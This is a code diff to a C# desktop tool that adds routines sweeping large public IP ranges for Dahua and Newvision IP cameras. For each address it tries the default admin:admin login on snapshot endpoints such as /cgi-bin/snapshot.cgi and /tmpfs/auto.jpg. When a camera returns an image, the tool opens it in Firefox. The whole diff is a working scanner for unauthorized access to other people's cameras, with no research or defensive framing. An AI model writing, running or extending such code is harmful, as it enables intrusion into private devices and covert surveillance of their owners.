@@ -18,6 +18,7 @@ using System.Threading;
 using System.Net;
 using SnmpSharpNet;
 using System.Diagnostics;
+using System.Net.Sockets;
 
 namespace TestIP
 {
@@ -99,6 +100,7 @@ namespace TestIP
         public Thread thAsync { get; set; }
         public Thread thCount { get; set; }
         string mimeType = "image/jpeg";
+        string Jpeg = "image/jpeg";
         public int ContadorRequest = 0;
         public int ContadorResponse = 0;
         //public string Title { get; set; } 
@@ -248,16 +250,15 @@ namespace TestIP
 
         private void btnScanAll_Click(object sender, RoutedEventArgs e)
         {
-            IpAddress Ip = new IpAddress("152.170.0.0");
+            IpAddress Ip = new IpAddress("181.21.0.0");
 
             while (!stop)
             {
                 try
-                {
-                    
+                {                    
                     string BaseUrl = "http://" + Ip;
                     RestClient client = new RestClient(BaseUrl);
-                    client.Timeout = 3000;
+                    client.Timeout = 5000;
                     client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
                     RestRequest request = new RestRequest();
                     //request.Credentials = Credentials; //solo newvision  
@@ -285,6 +286,272 @@ namespace TestIP
             }
 
             Console.WriteLine("DONE!");
+        }
+
+        private void BtnDahuaAll_Click(object sender, RoutedEventArgs e)
+        {
+            
+            new Thread(() => Dahua()).Start();
+
+
+            //while (!stop)
+            //{
+
+            //    var IpEnd = Ip.Increment(255 * 10);
+            //    //List<IpAddress> Ips = new List<IpAddress>();
+            //    //Ips.Clear();
+
+            //    while (!stop && Ip != IpEnd)
+            //    {
+            //        //Ips.Add(Ip);
+
+            //        try
+            //        {
+            //            string BaseUrl = "http://" + Ip;
+            //            RestClient client = new RestClient(BaseUrl);
+            //            client.Timeout = 3000;
+            //            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+            //            RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
+            //            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+            //            client.ExecuteAsync(request, response =>
+            //            {
+            //                if (response.StatusCode == System.Net.HttpStatusCode.OK)
+            //                {
+            //                    Console.WriteLine(response.ResponseUri.Host);
+            //                    IsDahua(response.ResponseUri.Host);
+            //                }
+
+            //                //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+            //                //{
+            //                //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
+            //                //}
+            //            });                        
+
+            //            Ip = Ip.Increment(1);
+
+            //        }
+            //        catch (Exception ex)
+            //        {
+            //            Console.WriteLine(ex.Source + " " + ex.Message);
+            //        }
+            //    }
+
+            //    //new Thread(() => Dahua(Ips)).Start();                
+
+            //    int count = 0;
+
+            //    while (count < 40)
+            //    {
+            //        Thread.Sleep(250);
+            //        count++;
+            //    }                
+            //}           
+
+            //Console.WriteLine("DONE!");
+        }
+
+        private void Dahua()
+        {
+            //    int ResponsesCount = 0;
+
+
+            //    string BaseUrl = "http://" + "152.171.0.0";
+            //    RestClient client = new RestClient(BaseUrl);
+            //    client.Timeout = 2000;
+            //    client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+            //    RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
+            //    request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+            //    client.ExecuteAsync(request, response =>
+            //    {
+            //        if (response.StatusCode == System.Net.HttpStatusCode.OK)
+            //        {
+
+            //            //if (!response.Content.Contains("<small>© 2015 Technicolor. All rights reserved. </small>"))
+            //            //{
+            //            //    //OPEN BROWSER
+            //            Console.WriteLine(response.ResponseUri.Host);
+            //            IsDahua(response.ResponseUri.Host);
+            //            //}
+
+            //        }
+
+            //        ResponsesCount++;
+            //    });
+
+
+
+            //while (!stop)
+            //{
+            //    Thread.Sleep(500);                
+            //}
+
+
+            //Console.WriteLine("Termino Hilo");
+
+            IpAddress Ip = new IpAddress("181.21.0.0");
+
+            while (!stop)
+            {
+
+                var IpEnd = Ip.Increment(255 * 5);
+                //List<IpAddress> Ips = new List<IpAddress>();
+                //Ips.Clear();
+
+                while (!stop && Ip != IpEnd)
+                {
+                    //Ips.Add(Ip);
+
+                    try
+                    {
+                        string BaseUrl = "http://" + Ip;
+                        RestClient client = new RestClient(BaseUrl);
+                        client.Timeout = 4000;
+                        client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+                        RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
+                        request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+                        client.ExecuteAsync(request, response =>
+                        {
+                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
+                            {
+                                Console.WriteLine(response.ResponseUri.Host);
+                                IsDahua(response.ResponseUri.Host);
+                            }
+
+                            //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+                            //{
+                            //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
+                            //}
+                        });
+
+                        Ip = Ip.Increment(1);
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Source + " " + ex.Message);
+                    }
+                }
+
+                //new Thread(() => Dahua(Ips)).Start();                
+
+                int count = 0;
+
+                while (count < 50)
+                {
+                    Thread.Sleep(250);
+                    count++;
+                }
+            }
+
+            Console.WriteLine("DONE!");
+
+        }
+
+        private void IsDahua(string Ip)
+        {
+            string BaseUrl = "http://" + Ip;
+            RestClient client = new RestClient(BaseUrl);
+            client.Timeout = 10000;
+            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+            RestRequest request = new RestRequest("/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1", Method.GET);
+            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+                        
+            IRestResponse response = client.Execute(request);
+
+            if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+            {                
+                Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=admin&q=1");
+
+            }
+        }
+
+        private void IsNewvision(string Ip)
+        {
+            string BaseUrl = "http://" + Ip;
+            RestClient client = new RestClient(BaseUrl);
+            client.Timeout = 10000;
+            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+            RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
+            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+            IRestResponse response = client.Execute(request);
+
+            if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+            {
+                Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/tmpfs/auto.jpg");
+
+            }
+        }
+
+        private void Newvision()
+        {            
+
+            IpAddress Ip = new IpAddress("152.170.0.0");
+
+            while (!stop)
+            {
+
+                var IpEnd = Ip.Increment(255 * 5);
+                //List<IpAddress> Ips = new List<IpAddress>();
+                //Ips.Clear();
+
+                while (!stop && Ip != IpEnd)
+                {
+                    //Ips.Add(Ip);
+
+                    try
+                    {
+                        string BaseUrl = "http://" + Ip;
+                        RestClient client = new RestClient(BaseUrl);
+                        client.Timeout = 4000;
+                        client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+                        RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
+                        request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+                        client.ExecuteAsync(request, response =>
+                        {
+                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
+                            {
+                                Console.WriteLine(response.ResponseUri.Host);
+                                IsNewvision(response.ResponseUri.Host);
+                            }
+
+                            //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+                            //{
+                            //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
+                            //}
+                        });
+
+                        Ip = Ip.Increment(1);
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Source + " " + ex.Message);
+                    }
+                }
+
+                //new Thread(() => Dahua(Ips)).Start();                
+
+                int count = 0;
+
+                while (count < 50)
+                {
+                    Thread.Sleep(250);
+                    count++;
+                }
+            }
+
+            Console.WriteLine("DONE!");
+
+        }
+
+        private void BtnNewvisionAll_Click(object sender, RoutedEventArgs e)
+        {
+            new Thread(() => Newvision()).Start();
         }
     }
 }
